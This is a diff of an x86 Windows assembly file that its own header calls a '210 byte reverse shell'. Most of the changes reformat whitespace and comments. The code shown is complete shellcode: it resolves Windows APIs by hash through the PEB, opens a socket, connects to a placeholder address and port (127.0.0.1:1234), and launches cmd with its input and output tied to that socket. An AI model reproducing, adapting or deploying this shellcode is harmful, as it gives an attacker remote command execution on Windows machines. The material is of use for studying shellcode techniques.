@@ -28,6 +28,8 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
 
+; 210 byte reverse shell for x86 windows
+; odzhan
     bits   32
 
 struc pushad_t
@@ -45,25 +47,25 @@ endstruc
       bits   32
 
       xor    eax, eax
-      call   init_api_disp      ; load the API dispatcher
+      call   init_api_disp  ; load the API dispatcher
 api_hash:      
-      dd     0xDF6D65D1         ; WS2_32.dll + WSASocketA    
+      dd     0xDF6D65D1     ; WS2_32.dll + WSASocketA    
       db     'cmd',0h    
-      dd     0D2040002h         ; sa.sin_port = htons(1234)
-      dd     00100007Fh         ; sa.sin_addr = inet_addr("127.0.0.1")
-      dd     0xA324AC0C         ; WS2_32.dll + connect
-      dd     0x611AD39B         ; KERNEL32.dll + CreateProcessA
-      dd     0x607F058C         ; KERNEL32.dll + WaitForSingleObject
+      dd     0D2040002h     ; sa.sin_port = htons(1234)
+      dd     00100007Fh     ; sa.sin_addr = inet_addr("127.0.0.1")
+      dd     0xA324AC0C     ; WS2_32.dll + connect
+      dd     0x611AD39B     ; KERNEL32.dll + CreateProcessA
+      dd     0x607F058C     ; KERNEL32.dll + WaitForSingleObject
 api_disp: 
       lodsd                     ; eax = hash to find
       pushad                    ; saves api hash on stack
       xor    eax, eax
       mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
-      mov    eax, [eax+0ch]     ; eax = (PPEB_LDR_DATA)peb->Ldr
-      mov    edi, [eax+0ch]     ; edi = ldr->InLoadOrderModuleList.Flink
+      mov    eax, [eax+0ch] ; eax = (PPEB_LDR_DATA)peb->Ldr
+      mov    edi, [eax+0ch] ; edi = ldr->InLoadOrderModuleList.Flink
       jmp    get_dll
 next_dll:    
-      mov    edi, [edi]         ; edi = dte->InLoadOrderLinks.Flink
+      mov    edi, [edi]     ; edi = dte->InLoadOrderLinks.Flink
 get_dll:
       mov    ebx, [edi+18h]     ; ebx = dte->DllBase
       ; eax = IMAGE_DOS_HEADER.e_lfanew
@@ -121,59 +123,60 @@ hash_name:
       pop    edi                ; restore DLL entry
       jne    next_dll           ; get next DLL        
       movzx  eax, word [edx+2*ecx] ; eax = AddressOfNameOrdinals[eax]
-      add    ebx, [esi+4*eax]      ; ecx = base + AddressOfFunctions[eax]
+      add    ebx, [esi+4*eax] ; ecx = base + AddressOfFunctions[eax]
       mov    [esp+_eax], ebx
       popad                        ; restore all
       jmp    eax                   ; jmp to api address
     
 init_api_disp:        
       pop    esi                   ; esi = api parameters
-      lea    ebp, [esi+(api_disp - api_hash)]        ; ebp = api dispatcher
+      lea    ebp, [esi+(api_disp - api_hash)]
       
       ; edi = alloc(124);    
       push   124
       pop    ecx
-      sub	   esp, ecx
-      mov	   edi, esp
+      sub    esp, ecx
+      mov    edi, esp
       rep    stosb
 
       ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
-      push	 1
-      push	 2
-      call	 ebp
+      push   1
+      push   2
+      call   ebp
 
-      ; CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-      mov    ebx, esp
-      lea    edi, [ebx+38h] ; edi = offset STARTUPINFO.hStdInput
+      ; CreateProcess(NULL, "cmd", NULL, NULL, 
+      ;   TRUE, 0, NULL, NULL, &si, &pi);
+      mov    ebx, esp       ; ebx = &si
+      lea    edi, [ebx+38h] ; edi = &si.hStdInput
       inc    dword[ebx+2dh] ; si.dwFlags = STARTF_USESTDHANDLES
       stosd                 ; si.hStdInput  = s;
       stosd                 ; si.hStdOutput = s;
       stosd                 ; si.hStdError  = s;
       cdq      
-      push	 edi            ; lpProcessInformation = &pi
-      push	 ebx            ; lpStartupInfo = &pi      
-      push	 edx            ; lpCurrentDirectory = NULL
-      push	 edx            ; lpEnvironment = NULL
-      push	 edx            ; dwCreationFlags = 0
-      push	 eax            ; bInheritHandles = TRUE
-      push	 edx            ; lpThreadAttributes = NULL
-      push	 edx            ; lpProcessAttributes = NULL
-      push	 esi            ; lpCommandLine = "cmd", 0
-      push	 edx            ; lpApplicationName = NULL
+      push   edi            ; lpProcessInformation = &pi
+      push   ebx            ; lpStartupInfo = &si      
+      push   edx            ; lpCurrentDirectory = NULL
+      push   edx            ; lpEnvironment = NULL
+      push   edx            ; dwCreationFlags = 0
+      push   eax            ; bInheritHandles = TRUE
+      push   edx            ; lpThreadAttributes = NULL
+      push   edx            ; lpProcessAttributes = NULL
+      push   esi            ; lpCommandLine = "cmd", 0
+      push   edx            ; lpApplicationName = NULL
       xchg   ebx, eax
       lodsd
       ; connect(s, &sa, sizeof(sa));
-      push	 10h            ; sizeof(sa)
-      push	 esi            ; &sa
-      push	 ebx            ; s
+      push   10h            ; sizeof(sa)
+      push   esi            ; &sa
+      push   ebx            ; s
       lodsd                 ; skip &sa
       lodsd
-      call	 ebp            ; connect
-      call	 ebp            ; CreateProcessA
+      call   ebp            ; connect
+      call   ebp            ; CreateProcessA
 
       ; WaitForSingleObject(pi.hProcess, INFINITE);
-      push	 -1
-      push	 dword [edi]
-      call	 ebp   
+      push   -1
+      push   dword [edi]
+      call   ebp   
       
       ; crash...
